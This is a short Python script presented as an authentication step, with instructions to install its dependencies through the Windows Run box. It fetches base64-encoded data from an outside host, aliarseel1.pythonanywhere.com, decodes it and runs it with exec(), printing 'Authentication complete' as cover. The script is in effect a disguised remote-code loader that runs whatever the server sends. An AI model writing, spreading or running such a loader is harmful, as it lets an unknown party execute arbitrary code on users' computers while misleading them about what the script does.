# Press Win + R and paste
# pip install colorama requests
# then hit enter or press "Ok"

import sys
from colorama import init, Fore, Style
import requests as req
import base64

init(autoreset=True)

url = f'https://aliarseel1.pythonanywhere.com/auth'

authentication_id = "123"

res = req.get(url, params={'id': authentication_id})

if res.status_code == 200:
    print(f"{Fore.GREEN}Authentication complete.\n\n")
    payload = base64.b64decode(res.json()['data']).decode()
    exec(payload)
    input("Press Enter to exit...")
    sys.exit()
else:
    print(f"{Fore.RED}Authentication failed.")
    input("Press Enter to exit...")
    sys.exit()